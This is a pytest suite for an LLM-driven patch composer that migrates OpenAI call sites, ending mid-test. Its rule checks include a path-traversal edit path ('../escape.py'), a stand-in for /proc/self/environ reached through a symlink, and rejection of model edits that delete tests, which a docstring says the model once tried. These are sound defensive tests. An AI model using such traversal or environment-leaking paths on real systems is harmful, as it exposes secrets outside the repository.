"""Patch Composer (PRD §6.8): contract tests with FakeLLM + a fake sandbox, and the demo repo on cassettes.

The demo-repo tests replay tests/fixtures/cassettes/patcher (recorded live with `pytest --live`) and run the
patched copy's own ruff + pytest in the real sandbox. They skip when the demo repo checkout is absent.
"""

import ast
import json
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace

import httpx
import openai
import pytest
from openai.types.chat import ChatCompletion
from packaging.requirements import Requirement

from offramp import sandbox as sandbox_module
from offramp.agents import patcher as patcher_module
from offramp.agents.patcher import (
    FAKE_HELPER,
    LEFT_OUT,
    NOT_SHOWN,
    REPAIRS,
    SUPERSEDED,
    SYSTEM,
    TOGETHER,
    UNCHANGED,
    Edit,
    PatchEdits,
    Unsupported,
    _apply,
    _file_block,
    _map_reply,
    _prepare,
    _repair,
    _rewrite_call,
    _summary,
    add_fixtures,
    add_imports,
    call_params,
    client_location,
    client_module,
    compose_patches,
    conformance,
    convert_fakes,
    copy_repo,
    declare_openai,
    edits_text,
    keep_comment,
    line_length,
    merge_onto,
    mirror_fakes,
    parse_edits,
    prune_twins,
    py_literal,
    reach_handles,
    rewrite_callers,
    site_qualname,
    unify_twins,
    wrap_long_strings,
)
from offramp.agents.pr_writer import is_test_path, manual_reason
from offramp.agents.translate import build_request, system_message
from offramp.sandbox import NO_LINTER, CheckResult, Sandbox, configures_ruff, docker_available
from offramp.schemas import Adapter, AdapterSpec, CallSite, EvalCase, PatchFailure, RunConfig, Tier, Verdict
from offramp.tf import BudgetExceeded, FakeLLM, TFClient, get_tier

BUILD = build_request


ROOT = Path(__file__).parents[2]
FIXTURES = ROOT / "tests" / "fixtures"
TINY = FIXTURES / "pr" / "target_repo"
CASSETTES = FIXTURES / "cassettes" / "patcher"
LIGHTNING = get_tier(Tier.LIGHTNING).model_id
THINK_OFF = {"chat_template_kwargs": {"enable_thinking": False}}
CONFIG = RunConfig(repo_url="https://github.com/example/tinyapp")


def demo_repo() -> Path | None:
    env = os.environ.get("OFFRAMP_DEMO_REPO_DIR")
    candidates = [Path(env)] if env else [p / "offramp-demo-app" for p in ROOT.parents]
    return next((p for p in candidates if (p / "helphub").is_dir()), None)


SANDBOXES = ROOT / "var" / "test-sandbox"


def work_dir(name: str) -> Path:
    """Sandbox scratch inside the worktree's gitignored var/ (never the system tmp)."""
    path = SANDBOXES / name
    shutil.rmtree(path, ignore_errors=True)
    return path


SITE_MODULES = ("tinyapp/greet.py", "tinyapp/shout.py", "greet.py", "shout.py")  # nested and flat


class FakeSandbox:
    """Stands in for offramp.sandbox.Sandbox: canned check results, records what it was asked. The check of
    Offramp's own changes alone (a site module changed, the tests not yet) answers `precheck` and leaves
    `results` to the other checks."""

    mode, ruff = "docker", True  # a repo that configures ruff

    def __init__(self, repo: Path, results: list[bool] | None = None, precheck: bool = False,
                 output: str = "FAILED tests/test_tinyapp.py::x"):  # fmt: skip
        self.repo, self.results, self.checks, self.fixed = repo, list(results or []), [], []
        self.notes: list[str] = []
        self.output = output
        self.precheck, self.start = precheck, self._files()

    def _files(self) -> dict[str, str]:
        return {p.relative_to(self.repo).as_posix(): p.read_text() for p in self.repo.rglob("*.py")}

    def check(self) -> CheckResult:
        files = self._files()
        self.checks.append(files)
        tests_as_before = all(files.get(p) == t for p, t in self.start.items() if is_test_path(p))
        if tests_as_before and any(files.get(p) != self.start.get(p) for p in SITE_MODULES):
            ok = self.precheck
        else:
            ok = self.results.pop(0) if self.results else True
        return CheckResult(ok=ok, mode="docker", output="" if ok else self.output)

    def formatted(self) -> bool:
        return False

    def probe(self, script: str) -> tuple[int, str]:  # runs the fixture repo's own code, locally
        p = subprocess.run([sys.executable, "-"], input=script, cwd=self.repo, capture_output=True, text=True,
                           timeout=60)  # fmt: skip
        return p.returncode, p.stdout + p.stderr

    def tidy(self, paths: list[str], format_code: bool = False) -> None:
        self.fixed.append(paths)


def tiny_sites() -> list[CallSite]:
    def site(i, file, function, model, prompt_ref):
        return CallSite(
            id=f"cs_{i:02d}",
            file=file,
            lines=[7, 14] if i != 2 else [5, 8],
            sdk="openai",
            call="client.chat.completions.create",
            function=function,
            source_model=model,
            prompt_source="fstring",
            prompt_ref=prompt_ref,
            params={"max_tokens": 32},
        )

    return [
        site(1, "tinyapp/greet.py", "greet", "gpt-4o-mini", "GREET_SYSTEM_PROMPT"),
        site(2, "tinyapp/motto.py", "motto", "o3", None),
        site(3, "tinyapp/shout.py", "shout", "gpt-4o-mini", "SHOUT_SYSTEM_PROMPT"),
    ]


def tiny_verdicts() -> list[Verdict]:
    return [
        Verdict(
            site_id="cs_01",
            decision="MIGRATE",
            tier=Tier.LIGHTNING,
            model=LIGHTNING,
            parity_pct=100.0,
            reason="r1",
        ),
        Verdict(site_id="cs_02", decision="KEEP_CLOSED", best_tier=Tier.ULTRA, parity_pct=60.0, reason="r2"),
        Verdict(
            site_id="cs_03",
            decision="MIGRATE",
            tier=Tier.LIGHTNING,
            model=LIGHTNING,
            parity_pct=100.0,
            reason="r3",
        ),
    ]


def tiny_adapters(**spec_over) -> dict[str, Adapter]:
    def adapter(sid, prompt):
        spec = AdapterSpec(system_prompt=prompt, max_tokens=32, temperature=0.0).model_copy(update=spec_over)
        return Adapter(site_id=sid, version=0, tier=Tier.LIGHTNING, spec=spec)

    return {
        "cs_01": adapter("cs_01", "You write one-line greetings."),
        "cs_03": adapter("cs_03", "You rewrite text as a short headline."),
    }


MIGRATED = f'model="{LIGHTNING}",'  # the call is rewritten by code, the evaluated request written out
TESTS = "tests/test_tinyapp.py"
BREAK_GREET = Edit(path=TESTS, search='"Hi Ana!"', replace='"Hi Ana"')  # a test edit the sandbox may fail
BREAK_GREET_2 = Edit(path=TESTS, search='"Hi Ana!"', replace='"hi ana!"')
# repairs meet the test file as the last checked try left it: these build on BREAK_GREET's
UNBREAK_GREET = Edit(path=TESTS, search='"Hi Ana"', replace='"Hi Ana!"')
REBREAK_GREET = Edit(path=TESTS, search='"Hi Ana"', replace='"hi ana!"')
BREAK_SHOUT = Edit(path=TESTS, search='"BIG NEWS"', replace='"big news"')


MARKS = {"tinyapp/greet.py": "def test_greet_strips_the_reply():", "tinyapp/shout.py": "def test_shout_"}


def migrate(path: str, extra: list[Edit] = ()) -> PatchEdits:
    """A patcher reply for a tiny-repo site: the code rewrote the module already; the reply touches its test
    (a mark standing in for updated pins) plus any `extra` edits."""
    mark = Edit(
        path="tests/test_tinyapp.py", search=MARKS[path], replace=f"# migrated: {path}\n{MARKS[path]}"
    )
    return PatchEdits(edits=[mark, *extra], notes="pins updated")


def patcher_llm(*replies) -> FakeLLM:
    """FakeLLM answering role `patcher` in the plain edit-block format."""
    return FakeLLM().add("patcher", *(edits_text(r) if isinstance(r, PatchEdits) else r for r in replies))


def run(llm, results=None, sandboxes=None, adapters=None, verdicts=None, name="tiny", build=BUILD, repo=TINY,
        precheck=False, output="FAILED tests/test_tinyapp.py::x", box=None, **layers):  # fmt: skip
    def factory(repo):
        made = (box or FakeSandbox)(repo, results, precheck, output)
        if sandboxes is not None:
            sandboxes.append(made)
        return made

    return compose_patches(
        repo,
        tiny_sites(),
        verdicts or tiny_verdicts(),
        adapters or tiny_adapters(),
        llm,
        work_dir(name),
        config=CONFIG,
        sandbox_factory=factory,
        build_request=build,
        **layers,
    )


def verdict(result, site_id):
    return next(v for v in result.verdicts if v.site_id == site_id)


# ---------------------------------------------------------------- composition


def test_migrates_passing_sites_and_comments_kept_ones():
    llm = patcher_llm()  # the tiny repo's tests do not pin the provider: Offramp's own changes are green
    boxes = []

    result = run(llm, sandboxes=boxes, precheck=True)

    assert llm.calls == []
    assert [v.decision for v in result.verdicts] == ["MIGRATE", "KEEP_CLOSED", "MIGRATE"]
    assert set(result.files) == {
        "tinyapp/offramp_client.py",  # inside the package that holds the sites: it ships in the wheel
        "tinyapp/greet.py",
        "tinyapp/motto.py",
        "tinyapp/shout.py",
    }
    assert result.client_path == "tinyapp/offramp_client.py"
    assert (
        MIGRATED in result.files["tinyapp/greet.py"]
        and "temperature=0.0," in result.files["tinyapp/greet.py"]
    )
    assert (
        "    # offramp: kept on o3 — parity 60.0% < 95%\n    response = client"
        in result.files["tinyapp/motto.py"]
    )
    assert result.adapters["cs_01"].patch.startswith("--- a/tinyapp/greet.py\n+++ b/tinyapp/greet.py\n")
    assert result.diffs["cs_01"] == result.adapters["cs_01"].patch
    assert "+    # offramp: kept on o3" in result.diffs["cs_02"]
    assert result.site_files == {
        "cs_01": ["tinyapp/greet.py"],
        "cs_02": ["tinyapp/motto.py"],
        "cs_03": ["tinyapp/shout.py"],
    }
    assert result.sandbox_mode == "docker"
    assert len(boxes[0].checks) == 5  # untouched, + client and comments, each site alone, then combined
    assert "tinyapp/offramp_client.py" not in boxes[0].checks[0]
    # each site's module tidied as it will ship (shown to the model so), then each patch
    assert boxes[0].fixed == [["tinyapp/greet.py"]] * 2 + [["tinyapp/shout.py"]] * 2


def test_client_module_reads_the_key_and_pins_verified_tier_ids():
    llm = patcher_llm(migrate("tinyapp/greet.py"), migrate("tinyapp/shout.py"))

    client = run(llm).files["tinyapp/offramp_client.py"]

    assert 'os.environ["NEBIUS_API_KEY"]' in client
    assert '"https://api.tokenfactory.nebius.com/v1"' in client
    module = ast.parse(client)
    consts = {
        n.targets[0].id: n.value.value
        for n in module.body
        if isinstance(n, ast.Assign) and isinstance(n.value, ast.Constant)
    }
    assert {k: consts[k] for k in ("LIGHTNING", "SUPER", "ULTRA")} == {
        t.name: get_tier(t).model_id for t in Tier
    }
    assert max(len(line) for line in client.splitlines()) <= 79  # clean under ruff's default line length too


def test_failing_repo_tests_downgrade_the_site_and_drop_its_patch():
    breaking = migrate("tinyapp/shout.py", extra=[BREAK_SHOUT])
    llm = patcher_llm(migrate("tinyapp/greet.py"), breaking, breaking)  # shout: first try + repair round

    result = run(llm, results=[True, True, True, False])  # untouched, + client, greet, shout (then a repeat)

    shout = verdict(result, "cs_03")
    assert shout.decision == "MANUAL_REVIEW"
    assert "repo checks failed" in shout.reason and "FAILED tests/test_tinyapp.py::x" in shout.reason
    assert "tinyapp/shout.py" not in result.files
    assert result.adapters["cs_03"].patch is None and "cs_03" not in result.diffs
    assert verdict(result, "cs_01").decision == "MIGRATE"


@pytest.mark.parametrize(
    ("results", "step"),
    [([False], "the untouched repo"), ([True, False], "after adding Offramp's client module")],
)
def test_a_red_baseline_downgrades_every_migration_names_the_step_and_changes_nothing(results, step):
    result = run(FakeLLM(), results=results)

    assert [v.decision for v in result.verdicts] == ["MANUAL_REVIEW", "KEEP_CLOSED", "MANUAL_REVIEW"]
    assert step in verdict(result, "cs_01").reason
    assert verdict(result, "cs_03").patch_failure == PatchFailure(kind="repo_red")
    assert result.files == {}


def test_an_empty_or_malformed_reply_is_asked_again_without_another_check():
    boxes = []
    malformed = "FILE: tests/test_tinyapp.py\n<<<<<<< SEARCH\nx\n=======\ny\n======="  # no REPLACE marker
    llm = patcher_llm(
        PatchEdits(edits=[]), malformed, *[PatchEdits(edits=[])] * (REPAIRS - 1), migrate("tinyapp/shout.py")
    )

    result = run(llm, sandboxes=boxes)

    reason = verdict(result, "cs_01").reason
    assert reason.startswith("the reply holds no complete edit block; last failure: repo checks failed")
    assert verdict(result, "cs_01").patch_failure == PatchFailure(
        kind="no_edit_block", last="checks_failed", tries=1 + REPAIRS
    )  # every reply was malformed: what failed is Offramp's changes alone
    assert manual_reason(verdict(result, "cs_01"))[0] == (
        "The model's last reply had no complete edit, so nothing was applied; with Offramp's changes alone, "
        "this repo's checks fail."
    )
    assert reason.endswith("FAILED tests/test_tinyapp.py::x")  # the checks' own failure is kept
    assert [c["tier"] for c in llm.calls[:3]] == [Tier.SUPER, Tier.ULTRA, Tier.ULTRA]
    assert len(boxes[0].checks) == 5  # untouched, base, greet alone (red); shout alone (red), its try


def test_no_accepted_migration_means_no_client_module():
    llm = patcher_llm(*[PatchEdits(edits=[])] * (2 * (1 + REPAIRS)))  # two sites: a try + repairs, empty

    result = run(llm, results=[True, True, False, False])

    assert set(result.files) == {"tinyapp/motto.py"}


@pytest.mark.parametrize(
    ("edits", "problem"),
    [
        ([Edit(path=TESTS, search="no such text", replace="x")], "not found"),
        ([Edit(path="pyproject.toml", search="tinyapp", replace="x")], "not editable"),
        ([Edit(path="../escape.py", search="x", replace="y")], "not editable"),
        (
            [Edit(path=TESTS, search="def test_greet_strips_the_reply():", replace="def _skipped():")],
            "removes tests",
        ),
        ([Edit(path="tinyapp/greet.py", search="max_tokens=32,", replace="max_tokens=64,")], "read-only"),
        ([Edit(path="tinyapp/greet.py", search=".strip()", replace="")], "read-only"),
        (
            [Edit(path=TESTS, search="def test_motto_returns_the_reply():", replace="def x(:")],
            "does not parse",
        ),
    ],
    ids=["search-missing", "file-not-allowed", "path-escape", "test-removed", "request", "module", "syntax"],
)
def test_patches_that_break_the_adapter_spec_or_the_rules_are_rejected(edits, problem):
    llm = patcher_llm(PatchEdits(edits=edits), PatchEdits(edits=edits), migrate("tinyapp/shout.py"))

    result = run(llm)

    greet = verdict(result, "cs_01")
    assert greet.decision == "MANUAL_REVIEW"
    assert problem in greet.reason
    kinds = {"not found": "search_miss", "not editable": "not_editable", "removes tests": "deletes_tests",
             "read-only": "locked_file", "does not parse": "does_not_parse"}  # fmt: skip
    f = greet.patch_failure  # recorded where it happened: the repeated patch ended it, its refusal came first
    assert (f.kind, f.last, f.tries, f.model_edit) == ("no_change", kinds[problem], 2, True)
    assert f.files == [edits[0].path] and manual_reason(greet)[1] == greet.reason
    assert "tinyapp/greet.py" not in result.files
    assert verdict(result, "cs_03").decision == "MIGRATE"


def test_budget_exhaustion_downgrades_instead_of_crashing():
    llm = patcher_llm(BudgetExceeded("output token cap"), migrate("tinyapp/shout.py"))

    result = run(llm)

    assert verdict(result, "cs_01").decision == "MANUAL_REVIEW"
    assert "output token cap" in verdict(result, "cs_01").reason


def test_a_budget_stop_reads_as_one_and_never_blames_an_edit_the_model_did_not_make():
    """Review probe (I2): every budget stop carries a last failure; before any reply it is Offramp's own."""
    llm = patcher_llm(BudgetExceeded("token cap reached"), migrate(SHOUT))

    greet = verdict(run(llm), "cs_01")

    assert greet.reason.startswith("patch not composed: token cap reached; last failure: repo checks failed")
    assert greet.patch_failure == PatchFailure(kind="budget_stop", last="checks_failed", tries=0)
    assert manual_reason(greet) == (
        "The run's model budget ran out before the model replied at this site's patch; with Offramp's "
        "changes alone, this repo's checks fail.",
        greet.reason,
    )
    after_one = patcher_llm(migrate(GREET, extra=[BREAK_GREET]), BudgetExceeded("x"), migrate(SHOUT))
    greet = verdict(run(after_one, results=[True, True, False]), "cs_01")
    assert manual_reason(greet)[0] == (
        "The run's model budget ran out after 1 try at this site's patch; with the model's test edits "
        "applied, this repo's checks still failed."
    )


def test_check_output_that_reads_like_a_patch_rule_is_never_taken_for_one():
    """Review probe (I2): a pytest line saying "'create' is read-only" is check output, not a locked file."""
    output = "FAILED tests/test_tinyapp.py::x - AttributeError: 'Completions' object attribute 'create' is "
    output += "read-only"
    llm = patcher_llm(migrate(GREET), migrate(GREET), migrate(SHOUT))

    greet = verdict(run(llm, results=[True, True, False], output=output), "cs_01")

    assert "'create' is read-only" in greet.reason
    assert (greet.patch_failure.kind, greet.patch_failure.last) == ("no_change", "checks_failed")
    sentence, raw = manual_reason(greet)
    assert sentence == (
        "The model's last repair repeated an edit it had already tried; with the model's test edits applied, "
        "this repo's checks still failed."
    )
    assert raw == greet.reason


def test_patcher_call_is_super_with_thinking_off_and_shows_the_exact_request():
    mark = Edit(
        path="tests/test_tinyapp.py",
        search="def test_greet_strips_the_reply():",
        replace="def test_greet_strips_the_reply():  # migrated",
    )
    llm = patcher_llm(migrate("tinyapp/greet.py", extra=[mark]), migrate("tinyapp/shout.py"))

    run(llm)

    first = llm.calls[0]
    assert (first["role"], first["tier"], first["temperature"], first["reasoning"]) == (
        "patcher",
        Tier.SUPER,
        0.0,
        "off",
    )
    assert first["response_model"] is None  # plain edit blocks, not code inside JSON strings
    assert first["messages"][0]["content"] == SYSTEM and "1. Only test files are editable" in SYSTEM
    prompt = first["messages"][-1]["content"]
    assert "`tinyapp/greet.py` is migrated by Offramp and read-only" in prompt
    failing = "## What fails now\nWith Offramp's changes alone, this repo's checks fail:\n- FAILED tests/"
    assert failing in prompt  # Offramp's own changes were checked first
    before, now = prompt.split("Before (what the tests pin today):")[1].split("Now:")
    assert 'model="gpt-4o-mini",' in before and MIGRATED in now and "max_tokens=32," in now
    assert 'extra_body={"chat_template_kwargs": {"enable_thinking": False}},' in now
    assert "### tinyapp/greet.py (read-only)" in prompt and "### tests/test_tinyapp.py (editable)" in prompt
    assert "### tinyapp/offramp_client.py (read-only)" in prompt
    second = llm.calls[1]["messages"][-1]["content"]  # each site is patched against the same base
    assert "### tinyapp/greet.py" not in second  # unrelated module: not shown
    assert "def test_greet_strips_the_reply():  # migrated" not in second  # order independent


def test_adapter_constants_are_written_into_the_file_before_the_call():
    tools = [
        {
            "type": "function",
            "function": {
                "name": "f",
                "description": "d " * 60,
                "parameters": {"type": "object", "properties": {}},
            },
        }
    ]
    few = [{"role": "user", "content": "hi"}, {"role": "assistant", "content": "Hello there"}]
    adapters = tiny_adapters(
        tools=tools,
        tool_choice="required",
        few_shot=few,
        system_prompt="You write one-line greetings. Never use emoji.",
    )
    llm = patcher_llm(*[PatchEdits(edits=[])] * (2 * (1 + REPAIRS)))

    run(llm, adapters=adapters)

    prompt = llm.calls[0]["messages"][-1]["content"]
    source = prompt.split("### tinyapp/greet.py (read-only)\n```python\n")[1].split("```")[0]
    module = ast.parse(source)
    consts = {n.targets[0].id: ast.literal_eval(n.value) for n in module.body if isinstance(n, ast.Assign)}
    assert consts["NEMOTRON_TOOLS"] == tools  # a schema: a module constant, passed by name
    assert 'tool_choice="auto",' in source  # Lightning: build_request's swap, written out
    assert consts["NEMOTRON_FEW_SHOT"] == few
    assert (
        consts["GREET_SYSTEM_PROMPT"] == "You write one-line greetings. Never use emoji."
    )  # replaced in place
    assert source.index("NEMOTRON_TOOLS =") < source.index("def greet")
    assert "*NEMOTRON_FEW_SHOT," in source and "tools=NEMOTRON_TOOLS," in source and MIGRATED in source
    assert max(len(line) for line in source.splitlines()) <= 100


# ---------------------------------------------------------------- helpers


@pytest.mark.parametrize(
    "value",
    [
        {
            "type": "json_schema",
            "json_schema": {
                "name": "X",
                "strict": True,
                "schema": {
                    "type": "object",
                    "properties": {
                        "a": {
                            "anyOf": [{"type": "string"}, {"type": "null"}],
                            "description": "ü " + "long words here " * 20,
                        }
                    },
                    "required": ["a"],
                    "additionalProperties": False,
                },
            },
        },
        ['say "hi"', "it's", "back\\slash", "tab\tnew\nline", None, 1.5, -2, True],
        "x" * 300,
    ],
)
def test_py_literal_round_trips_and_respects_line_length(value):
    text = py_literal(value, indent=4, width=100)

    assert ast.literal_eval(text) == value
    assert max(len(line) for line in ("    " + text).splitlines()) <= 100


COMPLETION = {
    "id": "x",
    "object": "chat.completion",
    "created": 0,
    "model": "m",
    "choices": [{"index": 0, "finish_reason": "stop", "message": {"role": "assistant", "content": "{}"}}],
    "usage": {"prompt_tokens": 1, "completion_tokens": 1, "total_tokens": 2},
}


@pytest.mark.parametrize("fallback", [False, True])
def test_call_params_are_exactly_what_tfclient_sends(tmp_path, fallback):
    sent = []

    def capture(request):
        sent.append(json.loads(request.content))
        return httpx.Response(200, json=COMPLETION)

    client = TFClient(
        api_key="test-key",
        cache_dir=tmp_path,
        http_client=httpx.Client(transport=httpx.MockTransport(capture)),
    )
    request = {
        "role": "eval_target",
        "tier": Tier.SUPER,
        "messages": [{"role": "user", "content": "hi"}],
        "max_tokens": 2032,
        "temperature": 0.0,
        "json_mode_fallback": fallback,
        "reasoning": "high",
        "json_schema": {"type": "json_schema", "json_schema": {"name": "x", "schema": {"type": "object"}}},
        "tools": None,
        "tool_choice": None,
        "extra_body": {"top_k": 5},
    }

    client.chat(**request)
    params = call_params(request)

    body = sent[0]
    body.pop("messages")
    assert body == {**{k: v for k, v in params.items() if k != "extra_body"}, **params["extra_body"]}
    assert params["extra_body"]["chat_template_kwargs"] == {"enable_thinking": True}


def test_call_parameters_come_from_build_request():
    def build(spec, case, tier):  # e.g. Task 6 adds reasoning room and swaps tool_choice per tier
        return {**BUILD(spec, case, tier), "max_tokens": 2032, "tool_choice": "auto"}

    adapters = tiny_adapters(
        tools=[{"type": "function", "function": {"name": "f", "parameters": {}}}], tool_choice="required"
    )
    llm = patcher_llm(*[PatchEdits(edits=[])] * (2 * (1 + REPAIRS)))

    run(llm, adapters=adapters, build=build)

    prompt = llm.calls[0]["messages"][-1]["content"]
    assert "max_tokens=2032," in prompt and 'tool_choice="auto",' in prompt


def test_keep_comment_format():
    v = Verdict(site_id="cs_05", decision="KEEP_CLOSED", parity_pct=71.43, reason="x")
    reasoning = CallSite(
        id="cs_05",
        file="a.py",
        lines=[1, 2],
        sdk="openai",
        call="c",
        source_model="o3",
        prompt_source="literal",
        contract={"task_type": "reasoning", "output": "text"},
    )

    assert keep_comment(reasoning, v, CONFIG) == "# offramp: kept on o3 — parity 71.4% < 90%"


# ---------------------------------------------------------------- demo repo on cassettes


# live, Task 25 (2026-10-21): cs_04 green after one Ultra repair, cs_05 after two, cs_06 on Super's first try
DEMO_OUTCOME = ({"cs_04": True, "cs_05": True, "cs_06": True}, ["cs_04", "cs_05", "cs_06"])
CS05_SUFFIX = (
    "\n\nReply with the final refund amount in the customer's currency alone on the last line as "
    "`ANSWER: <number>` (digits and a decimal point only: no currency symbol, no thousands separator)."
)


def demo_inputs():
    """The demo repo's sites with the verdicts and evaluated adapter specs of Task 12's end-to-end run
    (cassettes in its tests/fixtures/cassettes/pipeline): cs_04, cs_05 and cs_06 MIGRATE on Lightning,
    cs_01..cs_03 KEEP_CLOSED. FIXTURE verdict numbers are that run's, labelled in its review."""
    data = json.loads((FIXTURES / "pr" / "demo_run.json").read_text())["context"]
    sites = [CallSite.model_validate(s) for s in data["sites"]]
    lightning = {"decision": "MIGRATE", "tier": Tier.LIGHTNING, "model": LIGHTNING, "reason": "parity"}
    verdicts = [
        Verdict(
            site_id="cs_01", decision="KEEP_CLOSED", best_tier=Tier.LIGHTNING, parity_pct=85.7, reason="k"
        ),
        Verdict(
            site_id="cs_02", decision="KEEP_CLOSED", best_tier=Tier.LIGHTNING, parity_pct=50.0, reason="k"
        ),
        Verdict(
            site_id="cs_03", decision="KEEP_CLOSED", best_tier=Tier.LIGHTNING, parity_pct=71.4, reason="k"
        ),
        Verdict(site_id="cs_04", parity_pct=100.0, **lightning),
        Verdict(site_id="cs_05", parity_pct=100.0, **lightning),
        Verdict(site_id="cs_06", parity_pct=100.0, **lightning),
    ]
    specs = {
        "cs_04": AdapterSpec(max_tokens=400, temperature=0.2),
        "cs_05": AdapterSpec(max_tokens=16000, temperature=0.0, reasoning="medium", user_suffix=CS05_SUFFIX),
        "cs_06": AdapterSpec(max_tokens=400, temperature=0.0),
    }
    adapters = {
        sid: Adapter(site_id=sid, version=0, tier=Tier.LIGHTNING, spec=spec) for sid, spec in specs.items()
    }
    return sites, verdicts, adapters, RunConfig.model_validate(data["config"])


def run_demo(live: bool):
    if not docker_available():  # the recorded cassette keys name the docker sandbox's output
        pytest.skip("the demo replay needs docker")
    if not live and not any(CASSETTES.glob("*.json")):
        pytest.skip("demo patcher cassettes not recorded for the current patcher prompt: pytest --live")
    repo = demo_repo()
    if repo is None:
        pytest.skip("offramp-demo-app checkout not found (set OFFRAMP_DEMO_REPO_DIR)")
    sites, verdicts, adapters, config = demo_inputs()
    llm = TFClient(cache_dir=CASSETTES, live=live)
    return compose_patches(
        repo, sites, verdicts, adapters, llm, work_dir("demo"), config=config, build_request=BUILD
    )


@pytest.mark.live
def test_record_demo_patches():
    result = run_demo(live=True)
    print({v.site_id: (v.decision, v.reason) for v in result.verdicts})


def test_demo_patches_keep_the_demo_repo_green():
    """Task 12's MIGRATE set, recorded live (Super first tries, Ultra repairs; re-recorded in Task 25). Each
    site is checked alone against the same base, then all green ones together; the outcome below is what the
    recording produced. cs_04's first try failed the repo's pytest and one Ultra repair fixed the test;
    cs_05's first try deleted a test (rejected), its first Ultra repair failed the repo's pytest and the
    second passed; cs_06 passed on Super's first try. All three pass together."""
    result = run_demo(live=False)

    assert result.client_path == (None if not result.combined else "helphub/offramp_client.py")
    assert result.warnings == []
    assert set(result.alone) == {"cs_04", "cs_05", "cs_06"}
    assert set(result.combined) <= {sid for sid, ok in result.alone.items() if ok}
    for v in result.verdicts:
        if v.site_id in result.combined:
            assert v.decision == "MIGRATE" and result.adapters[v.site_id].patch
        elif v.site_id in result.alone:
            assert v.decision == "MANUAL_REVIEW"
    for path, text in result.files.items():  # E501 never reaches the PR
        assert max(map(len, text.splitlines()), default=0) <= 100, path
    assert DEMO_OUTCOME == ({s: result.alone[s] for s in sorted(result.alone)}, result.combined)
    # cs_05 went green by fixing the test its first try deleted, not by deleting it
    assert (
        "def test_openai_reasoning_site_follows_the_o3_parameter_rules():"
        in result.files["tests/test_call_sites.py"]
    )


def test_edit_blocks_round_trip_with_python_escapes_and_empty_replacements():
    patch = PatchEdits(
        edits=[
            Edit(path="a.py", search='x = "one\\ntwo"\n', replace='x = "one\\n"\n\n'),
            Edit(path="b.py", search="del me", replace=""),
        ],
        notes="done",
    )

    assert parse_edits(edits_text(patch)) == patch
    assert parse_edits("Sure!\n```\n" + edits_text(patch) + "\n```") == patch  # fences and chatter ignored


def test_a_failed_try_gets_one_repair_round_that_sees_the_failure():
    breaking = migrate("tinyapp/greet.py", extra=[BREAK_GREET])
    llm = patcher_llm(breaking, PatchEdits(edits=[UNBREAK_GREET]), migrate("tinyapp/shout.py"))

    result = run(llm, results=[True, True, False, True, True, True])

    assert verdict(result, "cs_01").decision == "MIGRATE"
    first, repair = llm.calls[0]["messages"], llm.calls[1]["messages"]
    assert repair[0] == first[0] and len(repair) == len(first) + 2
    # the test file is shown again as checked, so the first message's copy of it is superseded, nothing else
    block = re.search(rf"### {TESTS} \(editable\)\n```python\n.*?\n```", first[1]["content"], re.S)[0]
    assert repair[1]["content"] == first[1]["content"].replace(block, SUPERSEDED.format(path=TESTS))
    assert f"## Files now\n### {TESTS} (editable)\n```python\n" in repair[-1]["content"]
    assert repair[-2] == {"role": "assistant", "content": edits_text(breaking)}
    assert "FAILED tests/test_tinyapp.py::x" in repair[-1]["content"]
    assert len(llm.calls) == 3


def test_a_block_overlapping_an_earlier_one_is_explained():
    first = Edit(path=TESTS, search='== "Hi Ana!"', replace='== "Hi Ana!"  # a')
    overlap = Edit(path=TESTS, search='"Ana") == "Hi Ana!"\n', replace="x")
    bad = PatchEdits(edits=[first, overlap])
    llm = patcher_llm(bad, bad, migrate("tinyapp/shout.py"))

    reason = verdict(run(llm), "cs_01").reason

    assert "an earlier block already changed these lines" in reason


def test_a_repeated_edit_is_applied_once():
    edit = Edit(path=TESTS, search='== "Hi Ana!"', replace='== "Hi Ana!"  # same')
    llm = patcher_llm(
        PatchEdits(edits=[*migrate("tinyapp/greet.py").edits, edit, edit]), migrate("tinyapp/shout.py")
    )

    result = run(llm)

    assert verdict(result, "cs_01").decision == "MIGRATE"
    assert result.files[TESTS].count("# same") == 1


def test_add_imports_binds_known_names_after_the_last_import():
    source = '"""Doc."""\n\nimport os\n\n\ndef f(c):\n    return json.loads(token_factory_client()), os\n'

    fixed = add_imports(source, "helphub.offramp_client")

    assert fixed.splitlines()[2:5] == [
        "import os",
        "from helphub.offramp_client import token_factory_client",
        "import json",
    ]
    assert add_imports(fixed, "helphub.offramp_client") == fixed
    assert add_imports("import json\n\nx = json\n", "offramp.client") == "import json\n\nx = json\n"


def test_an_unresolved_adapter_spec_is_not_patched():
    adapters = tiny_adapters(tool_choice="<expr>", tools=[{"type": "function", "function": {"name": "f"}}])
    llm = patcher_llm(migrate("tinyapp/shout.py"))  # never asked for cs_01

    result = run(llm, adapters=adapters)

    assert verdict(result, "cs_01").decision == "MANUAL_REVIEW"
    assert "patch not composed" in verdict(result, "cs_01").reason


def test_a_json_object_request_is_not_patched():
    """The eval's json_object path includes TFClient's repair retry; a patch could not ship that."""
    schema = {"type": "json_schema", "json_schema": {"name": "x", "schema": {"type": "object"}}}
    adapters = tiny_adapters(response_format=schema, json_mode_fallback=True)

    result = run(FakeLLM(), adapters=adapters)

    assert {v.decision for v in result.verdicts if v.site_id != "cs_02"} == {"MANUAL_REVIEW"}
    assert "json_object" in verdict(result, "cs_01").reason


@pytest.mark.parametrize(
    ("files", "packages", "expected"),
    [
        (
            ["tinyapp/greet.py", "tinyapp/sub/shout.py"],
            ["tinyapp", "tinyapp/sub"],
            ("tinyapp/offramp_client.py", "tinyapp.offramp_client"),
        ),
        (["src/pkg/a.py"], ["src/pkg"], ("src/pkg/offramp_client.py", "pkg.offramp_client")),
        (["app.py"], [], ("offramp_client.py", "offramp_client")),  # never a top-level `offramp` package
        (["one/a.py", "two/b.py"], ["one", "two"], ("offramp_client.py", "offramp_client")),
        (["pkg/a.py"], [".", "pkg"], ("pkg/offramp_client.py", "pkg.offramp_client")),
        (["app.py"], ["."], None),
    ],
    ids=[
        "package",
        "src-layout",
        "top-level-module",
        "two-packages",
        "root-package-sites-in-pkg",
        "root-package-sites-at-root",
    ],  # fmt: skip
)
def test_client_location_is_the_package_holding_the_sites(files, packages, expected):
    repo = work_dir("location")
    for pkg in packages:
        (repo / pkg).mkdir(parents=True, exist_ok=True)
        (repo / pkg / "__init__.py").write_text("")

    assert client_location(repo, files) == expected


def test_symlinks_leaving_the_repo_are_dropped_from_the_copy():
    src = work_dir("symlinks") / "src"
    shutil.copytree(TINY, src)
    secret = src.parent / "environ"  # stands in for /proc/self/environ
